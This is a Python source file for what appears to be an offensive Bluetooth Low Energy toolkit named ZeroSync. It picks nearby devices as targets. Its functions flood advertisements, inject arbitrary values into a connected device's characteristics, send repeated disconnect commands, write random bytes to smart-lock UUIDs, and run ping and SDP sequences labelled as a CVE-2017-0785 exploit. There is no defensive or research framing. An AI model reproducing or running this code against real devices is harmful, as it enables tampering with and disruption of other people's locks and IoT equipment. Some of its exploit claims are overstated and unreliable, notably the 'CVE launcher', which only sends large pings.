#!/usr/bin/env python3
import os
import sys
import time
import random
import subprocess
from datetime import datetime
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_PUBLIC, ADDR_TYPE_RANDOM, BTLEException
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console()
seen_devices = {}

class BLEHandler(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)
    def handleNotification(self, cHandle, data):
        console.print(f"[yellow]📥 Notification from device: {data}[/yellow]")

def scan_devices():
    console.print("[cyan]🔎 Scanning for BLE devices...[/cyan]")
    scanner = Scanner()
    try:
        devices = scanner.scan(8.0)
        for idx, d in enumerate(devices):
            mac = d.addr
            rssi = d.rssi
            if mac not in seen_devices:
                seen_devices[mac] = {
                    "first_seen": datetime.now().strftime("%H:%M:%S"),
                    "max_rssi": rssi
                }
            else:
                seen_devices[mac]["max_rssi"] = max(seen_devices[mac]["max_rssi"], rssi)
            console.print(f"[magenta]{idx}[/magenta]: {mac} RSSI={rssi} dB")
        return devices
    except BTLEException as e:
        console.print(f"[red]❌ Scan error: {e}[/red]")
        return []



# === BLE Mesh Flooding / Desync ===
def mesh_flood_attack():
    console.print("[bold cyan]🌐 Launching BLE Mesh Flood Attack...[/bold cyan]")
    try:
        subprocess.run(["bluetoothctl", "power", "on"], stdout=subprocess.DEVNULL)
        subprocess.run(["bluetoothctl", "advertise", "on"], stdout=subprocess.DEVNULL)
        aliases = ["NODE_01", "NODE_99", "SPAMBOT", "💣_MESH", "XBLE", "LOOP_ERR", "NODE_FAIL"]
        i = 0
        while True:
            alias = random.choice(aliases)
            subprocess.run(["bluetoothctl", "system-alias", alias], stdout=subprocess.DEVNULL)
            console.print(f"[magenta]📡 Broadcasting: {alias}[/magenta]")
            i += 1
            if i % 10 == 0:
                console.print("[red]⚠️ Flood cycle complete – resetting advert loop[/red]")
                subprocess.run(["bluetoothctl", "advertise", "off"], stdout=subprocess.DEVNULL)
                time.sleep(0.5)
                subprocess.run(["bluetoothctl", "advertise", "on"], stdout=subprocess.DEVNULL)
            time.sleep(0.6)
    except KeyboardInterrupt:
        console.print("[red]🛑 Mesh flooding stopped[/red]")
        subprocess.run(["bluetoothctl", "advertise", "off"], stdout=subprocess.DEVNULL)


# === BLE Connection Hijack Proxy ===
def hijack_proxy():
    console.print("[bold cyan]🔁 BLE Connection Hijack Proxy Simulator[/bold cyan]")
    devices = scan_devices()
    if not devices:
        return
    try:
        idx = int(input("🔗 Target index to proxy: "))
        addr = devices[idx].addr
        p = Peripheral(addr, ADDR_TYPE_RANDOM)
        p.setDelegate(BLEHandler())
        services = p.getServices()
        console.print(f"[green]🧠 Connected to {addr} | Services: {len(list(services))}[/green]")

        while True:
            if p.waitForNotifications(2.0):
                continue
            for svc in services:
                for ch in svc.getCharacteristics():
                    try:
                        val = ch.read()
                        console.print(f"[yellow]📤 {ch.uuid} ➜ {val}[/yellow]")
                        echo = input(f"🔧 New value to inject to {ch.uuid}? (enter to skip): ")
                        if echo:
                            ch.write(echo.encode())
                            console.print(f"[green]✅ Injected {echo}[/green]")
                    except:
                        pass
    except KeyboardInterrupt:
        p.disconnect()
        console.print("[red]🛑 Proxy session ended[/red]")
    except Exception as e:
        console.print(f"[red]❌ Proxy error: {e}[/red]")


# === BLE Deauthentication / Connection Reset ===
def ble_deauth():
    console.print("[bold red]🚫 BLE Deauthentication – HCI Disconnect Flood[/bold red]")
    try:
        devices = scan_devices()
        if not devices:
            return
        idx = int(input("💣 Target device index to disconnect: "))
        addr = devices[idx].addr

        console.print(f"[magenta]📡 Attempting disconnect flood on {addr}...[/magenta]")
        for i in range(30):
            subprocess.run(["hcitool", "dc", addr], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            console.print(f"[red]✂️ Disconnect sent ({i+1})[/red]")
            time.sleep(0.3)
        console.print("[green]✅ Deauth attempt complete[/green]")
    except Exception as e:
        console.print(f"[red]❌ Deauth error: {e}[/red]")


# === Smart Lock / BLE IoT Fuzzer ===
def iot_fuzzer():
    console.print("[bold yellow]🔐 Smart Lock / BLE IoT Fuzzer[/bold yellow]")
    devices = scan_devices()
    if not devices:
        return
    try:
        idx = int(input("🔧 Choose target index: "))
        target = devices[idx].addr
        console.print(f"[magenta]🎯 Targeting {target} with IoT UUID fuzz...[/magenta]")

        known_lock_uuids = [
            "00002a00-0000-1000-8000-00805f9b34fb",  # Device Name
            "00002a19-0000-1000-8000-00805f9b34fb",  # Battery Level
            "00002a25-0000-1000-8000-00805f9b34fb",  # Serial Number
            "0000ff01-0000-1000-8000-00805f9b34fb",  # Custom Lock Write
            "0000ff02-0000-1000-8000-00805f9b34fb",  # Auth Notify
        ]

        p = Peripheral(target, ADDR_TYPE_PUBLIC)
        p.setDelegate(BLEHandler())
        for uuid in known_lock_uuids:
            try:
                ch = p.getCharacteristics(uuid=uuid)[0]
                val = ch.read()
                console.print(f"[cyan]🔍 UUID {uuid} ➜ {val}[/cyan]")
                test = os.urandom(random.randint(4, 16))
                ch.write(test)
                console.print(f"[red]💥 Fuzzed {uuid} with {test}[/red]")
            except Exception as e:
                console.print(f"[dim]⚠️ Skipped UUID {uuid}: {e}[/dim]")
            time.sleep(0.3)
        p.disconnect()
        console.print("[green]✅ IoT fuzzing complete[/green]")
    except Exception as e:
        console.print(f"[red]❌ Fuzzing error: {e}[/red]")


# === BLE CVE Launcher (e.g. CVE-2017-0785) ===
def launch_ble_cve():
    console.print("[bold red]💣 BLE CVE Launcher – Targeted Exploits[/bold red]")
    devices = scan_devices()
    if not devices:
        return
    try:
        idx = int(input("🎯 Select target index: "))
        addr = devices[idx].addr
        console.print(f"[yellow]🚨 Targeting {addr} for CVE-style fuzz attack[/yellow]")

        console.print("[cyan]💥 Launching malformed SDP packet (CVE-2017-0785 emulation)...[/cyan]")
        subprocess.run(["l2ping", "-c", "3", "-s", "1000", addr], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sdptool", "browse", addr], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        subprocess.run(["l2ping", "-c", "5", "-s", "2048", addr], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        console.print("[green]✅ CVE packet sequence dispatched[/green]")
    except Exception as e:
        console.print(f"[red]❌ CVE launch error: {e}[/red]")


# === Stealth Mode + Scan Evasion ===
def stealth_mode():
    console.print("[bold magenta]🕶️ Activating BLE Stealth Mode[/bold magenta]")
    try:
        subprocess.run(["bluetoothctl", "power", "on"], stdout=subprocess.DEVNULL)
        subprocess.run(["bluetoothctl", "discoverable", "off"], stdout=subprocess.DEVNULL)
        subprocess.run(["bluetoothctl", "pairable", "off"], stdout=subprocess.DEVNULL)
        subprocess.run(["hciconfig", "hci0", "noscan"], stdout=subprocess.DEVNULL)
        console.print("[green]✅ BLE is now hidden from public scans[/green]")
    except Exception as e:
        console.print(f"[red]❌ Stealth error: {e}[/red]")

# === Export Logs / Session Dump ===
def export_logs():
    from datetime import datetime
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    logfile = f"zerosync_logs/session_{timestamp}.log"
    os.makedirs("zerosync_logs", exist_ok=True)
    try:
        with open(logfile, "w") as f:
            f.write("ZeroSync v5.4 Session Log\n")
            f.write(f"Generated: {timestamp}\n\n")
            for mac, meta in seen_devices.items():
                line = f"{mac} | First seen: {meta['first_seen']} | Max RSSI: {meta['max_rssi']}\n"
                f.write(line)
        console.print(f"[green]📁 Exported session log to {logfile}[/green]")
    except Exception as e:
        console.print(f"[red]❌ Log export error: {e}[/red]")
